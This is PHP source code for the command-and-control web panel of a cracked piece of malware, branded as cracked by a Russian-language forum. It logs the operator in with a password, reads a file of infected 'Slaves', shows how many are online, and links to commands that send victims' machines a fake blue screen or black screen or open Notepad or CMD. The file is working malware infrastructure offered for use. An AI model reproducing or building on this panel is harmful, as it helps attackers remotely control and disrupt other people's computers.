<?php
session_start();

$expire2=time()+60*10;
$expire=time()+5;
$filename = "Slaves.txt";
$handle = fopen($filename, "r");
@$contents = fread($handle, filesize($filename));
fclose($handle);
include ("password.php");
@$sign=$_POST['password'];

	if(!empty($_POST['submit']))
	{
		setcookie("donateclose", 1, $expire2, "/");
		header ("location: index.php");
	}
else {}	

if(!empty($_POST['submit']))
{
	if($sign == $password)
	{
		$_SESSION['SIGNED'] = 1;
	}
	else 
	{ 
		setcookie('error', 1, $expire, '/');  
		header("location: index.php");
	}
}
else{}
?>
<!DOCTYPE HTML>
<html>
<head>
<title>CRACKED BY DARKOUT.XYZ</title>
<link href="css/style.css" rel="stylesheet" type="text/css">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
</head>
<body>
<div class="header">
</div>
<?php
if(isset($_SESSION['SIGNED']))
{
?>
<div class="contain">	
	<div class="control">
				<h3 align="center"> Actions </h3>
                <a class="link" href="AddFN.php?Function=" ><div  class="action">ClearAll</div></a>
                <a class="link" href="AddFN.php?Function=BlueScreen747&SpecialUser=False" ><div class="action">Send Blue Screen</div></a>
                <a class="link" href="AddFN.php?Function=BlackScreen747&SpecialUser=False" ><div class="action">Send BlackScreen</div></a>
                <a class="link" href="AddFN.php?Function=Notepad747&SpecialUser=False" ><div class="action">Send Start NotePad</div></a>
                <a class="link" href="AddFN.php?Function=CMD747&SpecialUser=False" ><div class="action">Send Start CMD</div></a>
				<div align="center">
                <?php // our string
$s = $contents;
 
// count characters
$c = substr_count($s, '+');
 
// output result (3)

if ($c > 0)
{
$cc = $c
	?>
	<div class="online">Slaves Online : <?php echo $cc; ?></div>
	<?php
	}
	else
	{
	?>
	<div class="offline">Slaves Online : 0</div>
	<?php
	}
	?>
	</div>
	</div>
	<?php
	if(!isset($_COOKIE['donateclose']))
	{
	?>
	<div class="overlay">
	</div>
<?php
}
else {}
?>
</div>
<?php
}
else
{
?>
<div class="error_sign" align="center">
<h3> WELCOME TO THE WEB CLIENT, CRACKED BY DARKOUT.XYZ </h3>
<p>
	<?php
		if(isset($_COOKIE["error"]))
		{ 
	?>
			<p class="sign_error">Password incorrect!</p>
	<?php
		}
	?>
<form class="form" action="" method="post" align="center">
	<input class="input_field" placeholder="Password" type="password" name="password">
	<input class="login_button" type="submit" name="submit" value="Gain access">
</form>
</p>
<div class="small">For questions about your password, please read the README file or contact us by using the contact button below.</div>
</div>

<?php
}
?>
	<a href="https://darkout.xyz/" target="blank"><div class="contact"> ФОРУМ, КОТОРЫЙ ИЗОБРЕЛ ЭТО ЧУДО! </div></a>
</body>
</html>
